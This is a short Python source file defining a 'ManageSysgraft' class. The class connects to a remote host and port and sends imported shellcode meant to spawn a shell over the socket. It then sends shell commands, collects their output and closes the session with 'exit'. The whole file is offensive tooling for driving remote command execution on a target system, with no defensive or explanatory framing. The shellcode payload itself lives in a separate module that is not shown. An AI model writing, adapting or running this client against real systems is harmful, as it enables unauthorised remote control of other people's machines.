from __future__ import print_function

import socket
import select
import threading

from Architectures import X64

class ManageSysgraft(object):
    def __init__(self, addr, port, architecture=X64):
        """
        Connect to a remote host and upload shellcode to start a Graft

        :param string addr: The remote host's address or hostname
        :param int port: The port to connect to
        :param Architecture architecture:
            An object with a shell attribute
            More specifically, a shell attribute containing shellcode for
            the target
        """
        self.architecture = architecture
        self.addr = addr
        self.port = port
        self.command_send_lock = threading.Lock()

        # Connect to the remote host
        self.conn = socket.create_connection((addr, port))

        # Send it the shellcode necessary to run a shell over the connection
        self.conn.send(self.architecture.shell)

    def send_command(self, command, recv_timeout=4, add_newline=True):
        """
        Send a command to the Graft, return the output received.
        Only one command may run at a time.  This will block until it can run.

        :param string command: The command to send
        :param int recv_timeout:
            The amount of time to wait after last output before considering
            output finished
        :param bool add_newline:
            If true, add a newline if command doesn't end in one

        :returns string: The command output
        """
        if add_newline and (len(command) < 1 or command[-1] != "\n"):
            command += "\n"

        with self.command_send_lock:
            self.conn.sendall(command)

            total_recvd = ""
            recvd = " "
            rdy = [" "]
            # Keep the loop going until either one is empty
            while rdy and recvd:
                # rdy will be empty if this times out
                rdy, _, _ = select.select([self.conn], [], [], recv_timeout)
                if self.conn in rdy:
                    # recvd will be empty or None if the connection closes
                    recvd = self.conn.recv(4096)
                    if recvd:
                        total_recvd += recvd

        return total_recvd

    def close_graft(self):
        self.conn.send("exit\n")
        self.conn.close()

